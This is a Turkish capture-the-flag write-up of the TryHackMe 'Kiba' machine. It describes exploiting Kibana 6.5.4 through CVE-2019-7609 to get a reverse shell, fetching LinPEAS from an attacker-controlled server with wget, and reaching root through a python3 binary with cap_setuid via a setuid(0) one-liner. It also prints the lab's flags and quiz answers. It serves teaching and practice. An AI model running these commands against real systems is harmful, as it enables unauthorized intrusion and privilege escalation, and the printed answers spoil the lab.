# TryHackMe Kiba — Writeup

**Zorluk:** Kolay-Orta
**Kategori:** Web / Elasticsearch / Kibana / Privilege Escalation
**IP:** 10.112.139.46

## Giriş

Kiba makinesi, eski bir Kibana sürümünde bulunan uzaktan kod çalıştırma açığıyla başlayıp, sistemde bırakılmış özel bir Python binary'sinin Linux capability yanlış yapılandırmasıyla root'a kadar giden kısa ama öğretici bir zincir sunuyor. Aşağıda tüm süreci adım adım anlatıyorum.

## 1. Keşif

İlk adım her zaman olduğu gibi tam port taraması:

```bash
nmap -sS -A -p- -T4 10.112.139.46
```

Sonuç:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
5601/tcp open  http    Elasticsearch Kibana (serverName: kibana)
```

3 port açık: SSH, HTTP ve Kibana'nın kendi arayüzünü sunduğu 5601 portu. Nmap zaten servisi doğrudan "Elasticsearch Kibana" olarak tanımlamış.

## 2. Web Servislerini Tarama

Önce 80 portundaki Apache sunucusuna baktım. Sayfa görsel olarak boştu, ffuf ile dizin taraması da bir sonuç vermedi. Bu yüzden 5601 portundaki Kibana arayüzüne yöneldim.

```
http://10.112.139.46:5601
```

Bu adres beni otomatik olarak şu URL'e yönlendirdi:

```
http://10.112.139.46:5601/app/kibana#/home?_g=()
```

Karşımda standart bir Kibana dashboard'u vardı. **Management** kısmına girince sürüm bilgisini görebildim:

```
Kibana Version: 6.5.4
```

Sürüm numarasını görünce ilk işim bu versiyonla ilgili bilinen açıkları araştırmak oldu.

## 3. CVE Araştırması — Kibana RCE

`Kibana 6.5.4` üzerinde araştırma yapınca **CVE-2019-7609** ile karşılaştım. Bu açık, Kibana'nın Timelion görselleştirme eklentisindeki bir prototype pollution zafiyeti üzerinden, 5.6.15 ile 6.6.1 arası sürümlerde uzaktan kod çalıştırmaya (RCE) izin veriyor.

Hazır bir exploit script'i buldum:

```
https://github.com/LandGrey/CVE-2019-7609/
```

Script'in mantığı şöyle:

- Önce hedefteki Kibana sürümünü doğruluyor.
- `/api/timelion/run` endpoint'ine, `.es(*).props()` fonksiyon zincirini kötüye kullanarak `label.__proto__.env` üzerinden prototype pollution yapan bir JSON payload gönderiyor.
- Bu sayede Node.js'in `NODE_OPTIONS` ortam değişkenine `child_process.exec` içeren bir komut enjekte edip, socket.io endpoint'ine yapılan bir istekle bu kodu tetikliyor.
- Sonuç olarak hedefte istediğimiz komutu çalıştırabiliyoruz — bu örnekte bir reverse shell.

## 4. Exploit ve İlk Erişim

Önce kendi makinemde bir listener açtım:

```bash
nc -nvlp 4444
```

Sonra exploit'i çalıştırdım:

```bash
python3 exploit.py -u http://10.112.139.46:5601/ -host 192.168.134.19 -port 4444 --shell
```

Script Kibana sürümünü doğruladı, açığın var olduğunu teyit etti ve `--shell` parametresiyle reverse shell payload'ını tetikledi. Listener tarafında bağlantı düştü:

```
kiba@ubuntu:/home/kiba/kibana/bin$
```

Shell'i biraz daha kullanılabilir hale getirmek için TTY yükseltmesi yaptım:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

## 5. User Flag

`/home/kiba` dizinine geçip içeriğe baktım:

```
kiba@ubuntu:/home/kiba$ ls
elasticsearch-6.5.4.deb  kibana  user.txt
```

```
kiba@ubuntu:/home/kiba$ cat user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```

## 6. Privilege Escalation — Capability Kötüye Kullanımı

Yetki yükseltme için sistemde LinPEAS çalıştırmaya karar verdim. Kendi makinemde basit bir HTTP sunucusu açtım:

```bash
python3 -m http.server 8000
```

Hedef sistemde `/tmp` dizinine geçip script'i indirdim:

```bash
wget http://192.168.134.19:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Çıktıda kırmızı renkle işaretlenmiş bir "Files with capabilities" bölümü dikkatimi çekti:

```
Files with capabilities (limited to 50):
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

`/home/kiba/.hackmeplease/python3` binary'sinde `cap_setuid+ep` capability'sinin set edilmiş olması gözüme çarptı. Bu capability, binary'nin process'in UID'sini normalde root yetkisi gerektiren bir işlemi, kernel'in olağan izin kontrollerini atlayarak değiştirebilmesini sağlıyor.

GTFOBins'te Python için bu capability'yi kontrol ettim ve önerilen istismar yöntemini buldum:

```python
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Sistemde varsayılan `python` komutuyla bunu doğrudan çalıştıramadım çünkü capability sadece o özel dizindeki binary'ye tanımlanmıştı. Bu yüzden doğrudan o binary'yi kullandım:

```bash
cd /home/kiba/.hackmeplease
./python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

Komut çalıştıktan sonra shell root olarak yeniden başladı.

## 7. Root Flag

```bash
cat root.txt
```

```
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```

## 8. Sonuç ve Öğrenilenler

Kiba, iki farklı ama birbirini tamamlayan konuyu tek makinede öğretiyor:

- **Yamalanmamış yazılım risk taşır.** Kibana 6.5.4 gibi bilinen ve halka açık bir CVE'ye sahip bir sürümün internete açık bırakılması, tek başına doğrudan RCE'ye kadar gidebiliyor.
- **Linux capability'leri SUID kadar tehlikeli olabilir.** `cap_setuid` gibi bir capability'nin bir binary'ye tanımlanması, o binary'yi çalıştırabilen herhangi bir kullanıcının doğrudan root olmasına izin verebiliyor. Bu yüzden capability denetimleri, klasik SUID taramaları kadar ciddiye alınmalı.

### Kısa Özet

| Adım | Aksiyon |
|---|---|
| Recon | Nmap ile SSH, HTTP ve Kibana (5601) portları tespit edildi |
| Web Enum | Kibana sürümü Management sayfasından tespit edildi: 6.5.4 |
| Zafiyet | CVE-2019-7609 (Kibana Timelion prototype pollution RCE) tespit edildi |
| Exploit | Hazır PoC ile reverse shell alındı |
| User | `kiba` kullanıcısı olarak shell elde edildi |
| PrivEsc | `cap_setuid` capability'sine sahip özel Python binary'si istismar edildi |
| Root | `setuid(0)` ile root shell elde edildi |

Flag'ler:

- **user.txt:** `THM{1s_easy_pwn3d_k1bana_w1th_rce}`
- **root.txt:** `THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}`

---

## Soru & Cevaplar

**What is the vulnerability that is specific to programming languages with prototype-based inheritance?**
Prototype pollution

**What is the version of visualization dashboard installed in the server?**
6.5.4

**What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000**
CVE-2019-7609

**Compromise the machine and locate user.txt**
`THM{1s_easy_pwn3d_k1bana_w1th_rce}`

**How would you recursively list all of these capabilities?**
`getcap -r /`

**Escalate privileges and obtain root.txt**
`THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}`

Okuduğunuz için teşekkürler, bir sonraki writeup'ta görüşmek üzere.
